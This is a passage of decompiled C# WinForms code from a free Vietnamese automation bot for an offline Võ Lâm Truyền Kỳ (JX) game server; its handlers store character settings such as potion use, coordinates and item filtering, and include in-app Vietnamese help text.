				comboBoxTenHieuThuocTamtru.Items.Add(Class1.smethod_1(string_54[i], 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxTenHieuThuocTamtru_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_54 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool flag = false;
		string text = comboBoxTenHieuThuocTamtru.Text;
		for (int i = 0; i < string_54.Length; i++)
		{
			if (text == Class1.smethod_1(string_54[i], 1))
			{
				Class40.string_0 = string_54[i];
				Class66.smethod_11(Class66.smethod_1(), "TenHieuthuocTamtru", Class40.string_0, "", 0);
				flag = true;
				break;
			}
		}
		if (flag)
		{
			int num2 = Class3.smethod_13(characterAccountConfig_1[num], Class40.string_0, 3);
			Class40.uint_0 = Class3.smethod_19(characterAccountConfig_1[num], num2);
			if (Class40.uint_0 == null)
			{
				Class40.uint_0 = new uint[2];
			}
			textBoxToadoHieuthuocTamtru.Text = Class40.uint_0[0] + "," + Class40.uint_0[1];
			Class66.smethod_11(Class66.smethod_1(), "ToadoHieuthuocTamtru_0", Class40.uint_0[0], "", 0);
			Class66.smethod_11(Class66.smethod_1(), "ToadoHieuthuocTamtru_1", Class40.uint_0[1], "", 0);
		}
	}

	private void buttonLayvitriCongTamtru_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			Class40.uint_1 = Class38.smethod_30(characterAccountConfig_1[num]);
			textBoxCongTamtru.Text = Class40.uint_1[0] + "," + Class40.uint_1[1];
			Class66.smethod_11(Class66.smethod_1(), "ToadoCongTamtru_0", Class40.uint_1[0], "", 0);
			Class66.smethod_11(Class66.smethod_1(), "ToadoCongTamtru_1", Class40.uint_1[1], "", 0);
		}
	}

	private void buttonPhimHdTamtru_Click(object sender, EventArgs e)
	{
		string text = "https://www.youtube.com/@meleira";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
	}

	private void checkBoxTDP_SL_Mau_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_115 = Convert.ToByte(checkBoxTDP_SL_Mau.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTDP_SL_Mana_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_117 = Convert.ToByte(checkBoxTDP_SL_Mana.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTDP_SL_Mau_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_116 = Class11.smethod_11(textBoxTDP_SL_Mau.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTDP_SL_Mana_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_118 = Class11.smethod_11(textBoxTDP_SL_Mana.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxTenMau2_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		string_55 = Class85.smethod_34(characterAccountConfig_1[num]);
		string[] array = Class85.smethod_34(characterAccountConfig_1[num], null, 23);
		comboBoxTenMau2.Items.Clear();
		if (string_55 != null)
		{
			Array.Sort(string_55);
			for (int i = 0; i < string_55.Length; i++)
			{
				comboBoxTenMau2.Items.Add(Class1.smethod_1(string_55[i], 1));
			}
		}
		if (array != null && array.Length != 0)
		{
			for (int j = 0; j < array.Length; j++)
			{
				if (array[j] == "Càn Khôn Tạo Hóa Đan (đại)")
				{
					comboBoxTenMau2.Items.Add(Class1.smethod_1(array[j], 1));
					if (string_0 == null)
					{
						string_0 = new string[1];
					}
					else
					{
						Array.Resize(ref string_0, string_0.Length + 1);
					}
					string_0[string_0.Length - 1] = array[j];
				}
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxTenMana2_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		bool_23 = false;
		string_56 = Class85.smethod_34(characterAccountConfig_1[num]);
		comboBoxTenMana2.Items.Clear();
		if (string_56 != null)
		{
			Array.Sort(string_56);
			for (int i = 0; i < string_56.Length; i++)
			{
				comboBoxTenMana2.Items.Add(Class1.smethod_1(string_56[i], 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxTenMau2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || (string_55 == null && string_57 == null))
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxTenMau2.Text;
		if (!(text == string.Empty))
		{
			if (string_55 != null)
			{
				for (int i = 0; i < string_55.Length; i++)
				{
					if (text == Class1.smethod_1(string_55[i], 1))
					{
						characterAccountConfig_1[num].string_16 = string_55[i];
						Class56.smethod_13(characterAccountConfig_1[num]);
						return;
					}
				}
			}
			if (string_0 == null)
			{
				return;
			}
			int num2 = 0;
			while (true)
			{
				if (num2 < string_0.Length)
				{
					if (text == Class1.smethod_1(string_0[num2], 1))
					{
						break;
					}
					num2++;
					continue;
				}
				return;
			}
			characterAccountConfig_1[num].string_16 = string_0[num2];
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
		else
		{
			characterAccountConfig_1[num].string_16 = string.Empty;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void comboBoxTenMana2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_56 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxTenMana2.Text;
		if (text == string.Empty)
		{
			characterAccountConfig_1[num].string_17 = string.Empty;
			Class56.smethod_13(characterAccountConfig_1[num]);
			return;
		}
		int num2 = 0;
		while (true)
		{
			if (num2 < string_56.Length)
			{
				if (text == Class1.smethod_1(string_56[num2], 1))
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].string_17 = string_56[num2];
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void checkBoxMau2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_110[0] = Convert.ToByte(checkBoxMau2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxRatioMau2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_110[1] = Class11.smethod_11(textBoxRatioMau2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTimerMau2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_110[2] = Class11.smethod_11(textBoxTimerMau2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoluongMau2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_110[3] = Class11.smethod_11(textBoxSoluongMau2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxMana2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_112[0] = Convert.ToByte(checkBoxMana2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxRatioMana2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_112[1] = Class11.smethod_11(textBoxRatioMana2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTimerMana2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_112[2] = Class11.smethod_11(textBoxTimerMana2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxSoluongMana2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_112[3] = Class11.smethod_11(textBoxSoluongMana2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxDuongMonBoom_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_128[0] = Convert.ToByte(checkBoxDuongMonBoom.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonThietLapDuongMon_Click(object sender, EventArgs e)
	{
		if (FormDuongMon.bool_0)
		{
			FormDuongMon.bool_0 = false;
			return;
		}
		try
		{
			int num = -1;
			int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num2)
			{
				string text = Class83.smethod_18(characterAccountConfig_1[num2]);
				if (text == "DUONGMON")
				{
					num = characterAccountConfig_1[num2].int_136;
				}
			}
			if (num <= 0 && characterAccountConfig_1 != null)
			{
				for (int i = 0; i < characterAccountConfig_1.Length; i++)
				{
					string text2 = Class83.smethod_18(characterAccountConfig_1[i]);
					if (text2 == "DUONGMON")
					{
						num = characterAccountConfig_1[i].int_136;
						break;
					}
				}
			}
			FormDuongMon.int_2 = num;
			FormDuongMon formDuongMon = new FormDuongMon();
			formDuongMon.int_0 = Cursor.Position.X;
			formDuongMon.int_1 = Cursor.Position.Y;
			formDuongMon.Show();
		}
		catch
		{
		}
	}

	private void checkBoxUuTienBomCuuchuyen_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_108 = Convert.ToByte(checkBoxUuTienBomCuuchuyen.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxOtrong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_60[0] = Convert.ToByte(checkBoxOtrong.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxOtrong_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxOtrong.Text;
		for (int i = 0; i < string_29.Length; i++)
		{
			if (text == string_29[i])
			{
				characterAccountConfig_1[num].int_60[1] = i;
				Class56.smethod_13(characterAccountConfig_1[num]);
				break;
			}
		}
	}

	private void buttonThoatHetgame_Click(object sender, EventArgs e)
	{
		bool flag = false;
		int[] array = Class24.smethod_24(Class56.string_21);
		if (array != null)
		{
			if (!flag)
			{
				string text = "Bạn chắc chắn muốn thoát hết game ?";
				if (MessageBox.Show(text, string_49, MessageBoxButtons.YesNo) == DialogResult.No)
				{
					return;
				}
				flag = true;
			}
			for (int i = 0; i < array.Length; i++)
			{
				Class24.smethod_48(array[i]);
				Thread.Sleep(60);
			}
		}
		if (Class56.string_19 == null || Class56.string_19 == string.Empty)
		{
			return;
		}
		string processName = Class56.string_19;
		if (Class11.smethod_1(Class56.string_19.ToUpper(), ".EXE") > 0)
		{
			string[] array2 = Class11.smethod_14(Class56.string_19, '.');
			processName = array2[0];
		}
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			if (processesByName == null || processesByName.Length == 0)
			{
				processesByName = Process.GetProcessesByName(Class56.string_19 + "\u00a0");
				if (processesByName == null || processesByName.Length == 0)
				{
					break;
				}
			}
			if (!flag)
			{
				string text2 = "Bạn chắc chắn muốn thoát hết game ?";
				if (MessageBox.Show(text2, string_49, MessageBoxButtons.YesNo) == DialogResult.No)
				{
					break;
				}
				flag = true;
			}
			try
			{
				for (int j = 0; j < processesByName.Length; j++)
				{
					Class24.smethod_53(processesByName[j]);
				}
				break;
			}
			catch
			{
			}
		}
	}

	private void comboBoxTrangbiTest_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		comboBoxTrangbiTest.Items.Clear();
		string_23 = null;
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		bool_23 = false;
		if (FormLocdoTest.int_4 <= 0)
		{
			string_23 = Class85.smethod_34(characterAccountConfig);
		}
		else
		{
			Class3.smethod_25(characterAccountConfig, ref string_23, 3);
		}
		if (string_23 != null)
		{
			Array.Sort(string_23);
			for (int i = 0; i < string_23.Length; i++)
			{
				comboBoxTrangbiTest.Items.Add(Class1.smethod_1(string_23[i], 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxTrangbiTest_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		string text = comboBoxTrangbiTest.Text;
		int num = 0;
		while (true)
		{
			if (num < string_23.Length)
			{
				if (text == Class1.smethod_1(string_23[num], 1))
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		FormLocdoTest.string_0 = string_23[num];
		Class66.smethod_11(Class66.smethod_1(), "TenVatPhamNhanTrangbiTest", Class11.smethod_16(FormLocdoTest.string_0), "", 0);
	}

	private void buttonTatcaNhanTrangbiTest_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 == null || FormLocdoTest.string_0 == null || FormLocdoTest.string_0 == string.Empty)
		{
			return;
		}
		int num = Class11.smethod_11(textBoxLocTocdo.Text);
		try
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				if (!characterAccountConfig_1[i].bool_25)
				{
					Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_10, 0, 4);
				}
				else
				{
					if (Class75.smethod_3(characterAccountConfig_1[i], Class75.uint_10, 4) > 0)
					{
						continue;
					}
					Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_10, 1, 4);
					Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_11, num, 4);
					characterAccountConfig_1[i].int_11 = num;
					for (int j = 0; j < 50; j++)
					{
						if (FormLocdoTest.int_1 <= 0)
						{
							break;
						}
						Thread.Sleep(10);
					}
					FormLocdoTest.int_1 = characterAccountConfig_1[i].int_136;
					new Thread(FormLocdoTest.smethod_2).Start();
				}
			}
		}
		catch
		{
		}
	}

	private void buttonDungTatcaTrangbiTest_Click(object sender, EventArgs e)
	{
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_10, 0, 4);
			}
		}
	}

	private void buttonNhanTrangbiTest_Click(object sender, EventArgs e)
	{
		FormLocdoTest.bool_0 = false;
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		if (characterAccountConfig.bool_25)
		{
			if (Class75.smethod_3(characterAccountConfig, Class75.uint_10, 4) <= 0)
			{
				Class75.smethod_2(characterAccountConfig, Class75.uint_10, 1, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_11, characterAccountConfig.int_11, 4);
				FormLocdoTest.int_1 = characterAccountConfig.int_136;
				new Thread(FormLocdoTest.smethod_2).Start();
			}
		}
		else
		{
			Class75.smethod_2(characterAccountConfig, Class75.uint_10, 0, 4);
		}
	}

	private void buttonLocTrangbi_Click(object sender, EventArgs e)
	{
		if (FormLocdoTest.bool_3)
		{
			FormLocdoTest.bool_3 = false;
			return;
		}
		try
		{
			FormLocdoTest.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormLocdoTest.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormLocdoTest formLocdoTest = new FormLocdoTest();
			formLocdoTest.int_14 = base.Left;
			formLocdoTest.int_15 = base.Top;
			formLocdoTest.int_16 = base.Width;
			formLocdoTest.int_17 = base.Height;
			formLocdoTest.Show();
		}
		catch
		{
		}
	}

	private void buttonPhimHDLoc_Click(object sender, EventArgs e)
	{
		string text = "https://www. /";
		string text2 = "https://www. /";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		string text3 = "Xem 2 video hướng dẫn tại: " + Class56.string_7 + text + Class56.string_7 + text2;
		FormTip.smethod_0(string_49, text3, 600000, 250, 80);
	}

	private void buttonThietlapClickNpc_Click(object sender, EventArgs e)
	{
		if (FormClickNPC.bool_0)
		{
			FormClickNPC.bool_0 = false;
			return;
		}
		try
		{
			FormClickNPC.int_0 = 0;
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				FormClickNPC.int_0 = characterAccountConfig_1[num].int_136;
			}
			FormClickNPC formClickNPC = new FormClickNPC();
			formClickNPC.int_1 = base.Left;
			formClickNPC.int_2 = base.Top;
			formClickNPC.int_3 = base.Width;
			formClickNPC.int_4 = base.Height;
			formClickNPC.Show();
		}
		catch
		{
		}
	}

	private void checkBoxTongKimXemSoluong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_98 = Convert.ToByte(checkBoxTongKimXemSoluong.Checked);
			Class66.smethod_11(Class66.smethod_1(), "TongKimXemSoluong", int_98, "", 0);
		}
	}

	private void linkLabelTrangchu_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = comboBoxGameOfWeb.Text;
		if (text == "khác")
		{
			return;
		}
		string[] array = text.Split('+', ' ', ',');
		string text2 = Environment.GetEnvironmentVariable("programfiles") + "\\Google\\Chrome\\Application\\chrome.exe";
		if (!Class11.smethod_17(text2))
		{
			text2 = Class66.smethod_0();
		}
		for (int i = 0; i < array.Length; i++)
		{
			text = array[i];
			if (text == string.Empty || text == null)
			{
				continue;
			}
			text = text.Trim();
			if (text.Length >= 6)
			{
				if (Class11.smethod_1(text, "://") < 0)
				{
					text = "http://" + text;
				}
				Class24.smethod_40(text2, "", text, 0);
			}
		}
	}

	private void buttonHuongDan_Click(object sender, EventArgs e)
	{
		string text = "TRAIN:|Đem ac đến bãi cần train. Bấm nút lấy tọa độ train, tọa độ ở đây lấy theo đường thẳng, ac đi đến cuối sẽ đi ngược lại.|Check vào mục train. Xong bấm áp dụng tất cả ac.||NHỮNG LƯU Ý:||- Nếu ac chạy tới quái lại giựt về tọa độ train mà không đánh, là do Khoảng cách tìm ac chính quá thấp + giá trị Tiếp cận thấp, bạn chỉnh 2 cái này lên cao tí, hoặc bỏ đừng check vào tiếp cận.||- Khi ac về thành, sẽ tự bán đồ theo mục lọc đồ (của phần nhặt đồ, bảng 1. Yêu cầu: check vào phần nhặt đồ), bán đồ xong sẽ cất đồ. Sau đó tự mua máu theo phần Hậu cần rồi lên lại bãi.||- Ac sẽ tự lên bãi theo cách: Trở lại điểm cũ -> Nếu không thành công sẽ đi Xa phu nơi đi qua -> Nếu không thành công sẽ tiếp tục đi bằng Thần hành phù (do đó auto không cần thiết phải có mục đi xa phu).||- Chức năng TĐP khi còn bao nhiêu bình máu, mana trong mục Hậu cần vẫn áp dụng khi train.||- Với các bản đồ đặc biệt thì auto TĐP, ví dụ như Mạc Bắc Thảo Nguyên, Vi Sơn đảo... mà thay vào đó là chức năng tự chạy về mua thuốc khi hết thuốc.||- Thổ địa phù khi sai map: Nếu 2 map liên thông thì ac sẽ tự chạy vào map train (ví dụ La Tiêu Sơn -> Lưỡng Thủy động là liên thông), còn không liên thông thì ac sẽ thổ địa phù.||- Khoảng cách giữa ac chính và ac phụ dưới nút [A] của auto vẫn được áp dụng trong mục train này (không nhỏ hơn 150).||- Chức năng thoát game khi sinh lực thấp được chuyển qua tab Hậu cần, phục hồi|";
		FormTip.smethod_0(string_49, text, 600000, 400, 320);
	}

	private void checkBoxRuong0_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_53 == null)
			{
				characterAccountConfig_1[num].int_53 = new int[5];
			}
			characterAccountConfig_1[num].int_53[0] = Convert.ToByte(checkBoxRuong0.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxRuong1_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_53 == null)
			{
				characterAccountConfig_1[num].int_53 = new int[5];
			}
			characterAccountConfig_1[num].int_53[1] = Convert.ToByte(checkBoxRuong1.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxRuong2_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_53 == null)
			{
				characterAccountConfig_1[num].int_53 = new int[5];
			}
			characterAccountConfig_1[num].int_53[2] = Convert.ToByte(checkBoxRuong2.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxRuong3_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			if (characterAccountConfig_1[num].int_53 == null)
			{
				characterAccountConfig_1[num].int_53 = new int[5];
			}
			characterAccountConfig_1[num].int_53[3] = Convert.ToByte(checkBoxRuong3.Checked);
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void buttonKhongcat_Click(object sender, EventArgs e)
	{
		if (FormKhongCatdo.bool_0)
		{
			FormKhongCatdo.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormKhongCatdo.int_0 = characterAccountConfig_1[num].int_136;
				FormKhongCatdo formKhongCatdo = new FormKhongCatdo();
				formKhongCatdo.int_2 = Cursor.Position.X;
				formKhongCatdo.int_3 = Cursor.Position.Y;
				formKhongCatdo.int_4 = base.Width;
				formKhongCatdo.int_5 = base.Height;
				formKhongCatdo.Show();
			}
		}
		catch
		{
		}
	}

	private void checkBoxXepdo_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_37 = Convert.ToByte(checkBoxXepdo.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonTimTrongthanh_Click(object sender, EventArgs e)
	{
		string text = "*Auto Kéo Xe cho Võ Lâm Truyền Kỳ Offline : ||1. Đây là Auto Miễn Phí - Phi Thương Mại||2. Auto dùng cho JX Hội Quán Offline by MEL||3. Nếu bạn bỏ tiền ra mua Auto này tức là bạn đã bị lừa ||  |";
		FormTip.smethod_0(string_49, text, 600000, 370, 200, bool_8: false, base.Left, base.Top);
	}

	private void buttonLayVitriXaphuCTQ_Click(object sender, EventArgs e)
	{
		if (FormXaphuCT.bool_0)
		{
			FormXaphuCT.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormXaphuCT.int_0 = characterAccountConfig_1[num].int_136;
				FormXaphuCT formXaphuCT = new FormXaphuCT();
				formXaphuCT.int_2 = base.Left;
				formXaphuCT.int_3 = base.Top;
				formXaphuCT.int_4 = base.Width;
				formXaphuCT.int_5 = base.Height;
				formXaphuCT.Show();
			}
		}
		catch
		{
		}
	}

	private void textBoxTimeXepdo_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_38 = Class11.smethod_11(textBoxTimeXepdo.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxNPC_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_8 = Convert.ToByte(checkBoxNPC.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagCoClickVaoNPC", int_8, "", 0);
		}
	}

	private void textBoxOso1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_75[1] = Class11.smethod_11(textBoxOso1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxOso2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_75[2] = Class11.smethod_11(textBoxOso2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxOso3_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_75[3] = Class11.smethod_11(textBoxOso3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxGanTenthuoc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_75[0] = Convert.ToByte(checkBoxGanTenthuoc.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonDenDiemKetiep_Click(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || FormChayBoss.string_2 == null)
		{
			return;
		}
		int num = -1;
		int length = FormChayBoss.string_2.GetLength(0);
		bool_23 = false;
		string text = comboBoxNoiBoss.Text;
		for (int i = 0; i < length; i++)
		{
			if (text == FormChayBoss.string_2[i, 0])
			{
				num = i;
				break;
			}
		}
		int num2 = num + 1;
		if (length <= num2)
		{
			num2 = 0;
		}
		int num3 = num2;
		int num4 = 0;
		while (FormChayBoss.string_2[num2, 0] == "...")
		{
			num2++;
			if (length <= num2)
			{
				num2 = 0;
				num4 = 1;
			}
			if (num4 > 0 && num3 <= num2)
			{
				break;
			}
		}
		comboBoxNoiBoss.Text = FormChayBoss.string_2[num2, 0];
		Thread.Sleep(100);
		if (characterAccountConfig_1 != null)
		{
			for (int j = 0; j < characterAccountConfig_1.Length; j++)
			{
				characterAccountConfig_1[j].int_0 = num2;
			}
		}
		buttonDenDiemKetiep.Text = "Đến điểm kế tiếp" + Class56.string_7 + "( " + (num2 + 1) + " )";
		bool_23 = true;
	}

	private void checkBoxTudongPT_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_121[0] = Convert.ToByte(checkBoxTudongPT.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTucheHT_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
